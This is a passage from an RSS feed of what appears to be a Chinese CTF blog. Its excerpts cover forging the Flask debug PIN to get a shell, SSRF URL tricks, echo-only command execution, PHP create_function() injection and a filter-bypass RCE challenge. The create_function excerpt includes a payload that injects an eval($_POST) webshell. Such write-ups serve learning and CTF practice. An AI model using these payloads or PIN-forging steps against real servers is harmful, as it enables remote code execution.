计算 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 probably_public_bits = [ username 运行当前程序的用户名 modname 当前对象的模块名，默认为flask.app getattr(app, &amp;amp;#34;__name__&amp;amp;#34;, app.__class__.__name__) 当前对象的名称，默认为Flask getattr(mod, &amp;amp;#34;__file__&amp;amp;#34;, None) flask包内的app.py的绝对路径 ] private_bits = [ str(uuid.getnode()) Mac地址的整型，通过int(Mac, 16)可以获取 get_machine_id() [ docker /proc/self/cgroup，正则分割 Linux /etc/machine-id，/proc/sys/kernl/random/boot_id，前者固定后者不固定 macOS ioreg -c IOPlatformExpertDevice -d 2中&amp;amp;#34;serial-number&amp;amp;#34; = &amp;amp;lt;{ID}部分 Windows 注册表HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid ] ] 那么我们主要研究如何得到docker的相关</description><content:encoded>0x01 前言 最近有道flask不仅仅可以绕过黑名单而且开启了debug模式可以进行pin值计算getshell
0x02 原理 pin码是flask在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式,可以理解为自带的webshell
计算 1 2 3 4 …</content:encoded></item><item><title>url中的好玩的姿势</title><link>https://baozongwi.xyz/p/url-interesting-techniques/</link><guid>https://baozongwi.xyz/p/url-interesting-techniques/</guid><pubDate>Sat, 17 Aug 2024 08:49:37 +0000</pubDate><description>ssrf...</description><content:encoded>0x01 前言 太久没有ssrf了，有些许遗忘，来复习一下顺便发现了一点点新姿势
0x02 url引用知识 许多URL结构保留一些特殊的字符用来表示特殊的含义，这些符号在URL中不同的位置有着其特殊的语义。 字符”;”, “/”, “?”, “:”, “@”, “=” 和”&amp;amp;amp;amp;”是被保留的。 …</content:encoded></item><item><title>一个echo能干嘛</title><link>https://baozongwi.xyz/p/what-can-echo-do/</link><guid>https://baozongwi.xyz/p/what-can-echo-do/</guid><pubDate>Thu, 15 Aug 2024 19:30:06 +0000</pubDate><description>0x01 前言 今天看了一下一道命令执行，只有echo，其他任何命令都没有的情况如果获得flag
说实话我测试了很久但是还是卡着了,什么环境变量啊七七八八的,但是这些方法本质都是构造出命令,可是如果bash中没有命令的情况如何解决呢
0x02 学习 基础 echo命令能干什么我们来了解一下
echo 命令主要用于在命令行界面（如 Linux、Unix 或 macOS 的终端，或 Windows 的命令提示符）中显示文本字符串。
那么自然也有与符号的衔接
项 描述 \a 显示警告 \b 显示退格 \c 在输出中禁止另外跟在最终参数后面的换行字符。 所有跟在 \c 序列后的字符都被忽略。 \f 显示走纸字符。 \n 显示换行字符。 \r 显示一个回车字符。 \t 显示制表符。 \v 显示垂直制表符。 \ 显示反斜杠符号。 \0数字 显示一个 ASCII 值为 0、1、2、3 位八进制数的八位字符。 大部分的我们都认识了，但是这个八进制打印字符我们可以做个例子
1 2 echo -e &amp;amp;#34;\0123&amp;amp;#34; 这里将会打印八进制为123的字符即S 1 2 echo -e &amp;amp;#34;\0173&amp;amp;#34; 这里会打印八进制为173，十进制为123的字符即{ 1 2 3 4 5 6 7 8 9 10 11 12 def decimal_to_octal(decimal_number): return oct(decimal_number)[2:] if __name__ == &amp;amp;#34;__main__&amp;amp;#34;: # 获取用户输入 decimal_number = int(input(&amp;amp;#34;请输入一个十进制整数: &amp;amp;#34;)) # 转换为八进制 octal_number = decimal_to_octal(decimal_number) # 输出结果 print(f&amp;amp;#34;{decimal_number} 的八进制表示为: {octal_number}&amp;amp;#34;) 这里还有个问题就是如何去解析</description><content:encoded>0x01 前言 今天看了一下一道命令执行，只有echo，其他任何命令都没有的情况如果获得flag
说实话我测试了很久但是还是卡着了,什么环境变量啊七七八八的,但是这些方法本质都是构造出命令,可是如果bash中没有命令的情况如何解决呢
0x02 学习 基础 echo命令能干什么我们来了解一下
echo …</content:encoded></item><item><title>create_function()注入</title><link>https://baozongwi.xyz/p/create-function-injection/</link><guid>https://baozongwi.xyz/p/create-function-injection/</guid><pubDate>Sat, 10 Aug 2024 18:45:05 +0000</pubDate><description>0x01 前言 对于这个函数,我之前一直是一知半解,基本就是知道一个闭合,然后嵌入恶意代码就啥都不知道了,昨天遇到了一个相关知识点,来彻底搞懂他
0x02 内容 了解 首先去官方手册看看这个函数
也就是说和eval有着异曲同工之妙
我们都知道eval()会使内置语句php解析,所以我们用;等闭合内部语句,然后代码执行,那么现在来看看这个
实验 首先最基本的用法创建匿名函数
1 create_function(&amp;amp;#39;$name&amp;amp;#39;,&amp;amp;#39;echo $name.&amp;amp;#34;wi&amp;amp;#34;&amp;amp;#39;) 等价
1 2 3 function fT($fname) { echo $fname.&amp;amp;#34;wi&amp;amp;#34;; } 那么这样一看就很明白了
随便写个代码
1 2 3 4 5 6 7 8 9 &amp;amp;lt;?php $id=$_GET[&amp;amp;#39;id&amp;amp;#39;]; $str2=&amp;amp;#39;echo $a&amp;amp;#39;.&amp;amp;#39;test&amp;amp;#39;.$id.&amp;amp;#34;;&amp;amp;#34;; echo $str2; echo &amp;amp;#34;&amp;amp;lt;br/&amp;amp;gt;&amp;amp;#34;; echo &amp;amp;#34;==============================&amp;amp;#34;; echo &amp;amp;#34;&amp;amp;lt;br/&amp;amp;gt;&amp;amp;#34;; $f1 = create_function(&amp;amp;#39;$a&amp;amp;#39;,$str2); ?&amp;amp;gt; 起一个环境
此时所创建的函数应该为
1 2 3 4 5 6 7 function fT($a) { echo $a.&amp;amp;#39;test&amp;amp;#39;.$id.; } 变为 function fT($a){ echo $a.&amp;amp;#39;test&amp;amp;#39;;}eval($_POST[&amp;amp;#39;a&amp;amp;#39;]);/*; } 那么后续代码都会被注释,且我们也成功注入
例题 一道很简单的题目(P神出的)
1 2 3 4 5 6 7 8 9 &amp;amp;lt;?php $action = $_GET[&amp;amp;#39;action&amp;amp;#39;] ?? &amp;amp;#39;&amp;amp;#39;; $arg = $_GET[&amp;amp;#39;arg&amp;amp;#39;] ?? &amp;amp;#39;&amp;amp;#39;; if(preg_match(&amp;amp;#39;/^[a-z0-9_]*$/isD&amp;amp;#39;, $action)) { show_source(__FILE__); } else { $action(&amp;amp;#39;&amp;amp;#39;, $arg); } 这里我们使用\来绕过</description><content:encoded>0x01 前言 对于这个函数,我之前一直是一知半解,基本就是知道一个闭合,然后嵌入恶意代码就啥都不知道了,昨天遇到了一个相关知识点,来彻底搞懂他
0x02 内容 了解 首先去官方手册看看这个函数
也就是说和eval有着异曲同工之妙
我们都知道eval()会使内置语句php解析,所以我们用;等闭合内部 …</content:encoded></item><item><title>记一次RCE</title><link>https://baozongwi.xyz/p/rce-case-study/</link><guid>https://baozongwi.xyz/p/rce-case-study/</guid><pubDate>Fri, 09 Aug 2024 17:30:24 +0000</pubDate><description>0x01 前言 今天随便搞了一个比赛,结果吧,我勒个刚,第一个RCE就绕不出来
0x02 action 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 &amp;amp;lt;?php error_reporting(0); highlight_file(__FILE__); function count_string_char($str) { $arr = []; foreach (str_split($str) as $value) { if (!in_array($value, $arr)) { array_push($arr, $value); } } return sizeof($arr); } if (isset($_POST[&amp;amp;#39;cmd&amp;amp;#39;]) &amp;amp;amp;&amp;amp;amp; is_string($_POST[&amp;amp;#39;cmd&amp;amp;#39;])) { $cmd = $_POST[&amp;amp;#39;cmd&amp;amp;#39;]; $c = count_string_char($cmd); if ($c &amp;amp;gt; 13) { die(&amp;amp;#34;$c too long&amp;amp;#34;); } if ( preg_match(&amp;amp;#39;/[a-z0-9]|&amp;amp;lt;|&amp;amp;gt;|\\?|\\[|\\]|\\*|@|\\||\\^|~|&amp;amp;amp;|\s/i&amp;amp;#39;, $cmd) ) { die(&amp;amp;#34;nonono&amp;amp;#34;); } eval( &amp;amp;#34;print($cmd);&amp;amp;#34; ); } else { exit(); } 首先观察这个function先,我就是理解错了,他的意思是将不重复的字符记在数组之中</description><content:encoded>0x01 前言 今天随便搞了一个比赛,结果吧,我勒个刚,第一个RCE就绕不出来
0x02 action 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 &amp;amp;amp;lt;?php …</content:encoded></item></channel></rss>